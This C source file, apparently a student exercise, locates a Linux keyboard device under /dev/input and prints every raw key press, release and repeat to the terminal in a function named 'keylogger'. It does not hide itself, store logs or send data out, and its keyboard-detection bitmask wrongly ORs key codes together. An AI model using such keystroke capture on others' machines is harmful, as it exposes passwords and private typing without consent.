/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
/*   Updated: 2018/09/28 18:07:49 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <signal.h>

static int			filter(const struct dirent *file)
{
	char			filename[512];
	struct stat		filestat;

	snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", file->d_name);
	if (stat(filename, &filestat))
		return 0;
	return S_ISCHR(filestat.st_mode);
}

static char			*get_keyboard()
{
	int				num;
	struct dirent	**files;
	int32_t			event_bitmap;
	int32_t			keybd_bitmap;
	char			filename[512];
	int				fd;
	char			*keybd;

	if ((num = scandir("/dev/input/", &files, &filter, &alphasort)) < 0)
		return NULL;
	keybd = NULL;
	for (int i = 0; i < num; i++)
	{
		if (!keybd)
		{
			event_bitmap = 0;
			keybd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;
			snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", files[i]->d_name);
			fd = open(filename, O_RDONLY);
			if (fd != -1)
			{
				ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
				if ((EV_KEY & event_bitmap) == EV_KEY)
				{
					ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
					if ((keybd_bitmap & event_bitmap) == keybd_bitmap)
						keybd = strdup(filename);
				}
				close(fd);
			}
		}
		free(files[i]);
	}
	free(files);
	return keybd;
}

int loop;

void sigint(int sig)
{
	(void)sig;
	loop = 0;
}

static void	keylogger(int keybd)
{
	int		nbread;
	struct input_event	events[128];

	signal(SIGINT, sigint);
	loop = 1;
	while (loop)
	{
		nbread = read(keybd, events, sizeof(struct input_event) * 128);
		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
		{
			printf("type: %d value: %d code: %d ", events[i].type, events[i].value, events[i].code);
			if (events[i].type == EV_KEY && events[i].value == 0)
			{
				printf("keyrelease: %d", events[i].code);
			}
			if (events[i].type == EV_KEY && events[i].value == 1)
			{
				printf("keypressed: %d", events[i].code);
			}
			if (events[i].type == EV_KEY && events[i].value == 2)
			{
				printf("keyrepeat: %d", events[i].code);
			}
			if (events[i].type == EV_SW)
			{
				printf("switch code: %d value: %d", events[i].code, events[i].value);
			}
		}
		printf("\n");
	}
}

int			main(void)
{
	char	*keyboard;
	int		fd;

	if ((keyboard = get_keyboard()) == NULL)
		return 1;
	printf("keyboard: %s\n", keyboard);
	if ((fd = open(keyboard, O_RDONLY)) < 0)
		return 1;
	free(keyboard);
	keylogger(fd);
	close(fd);
	return 0;
}
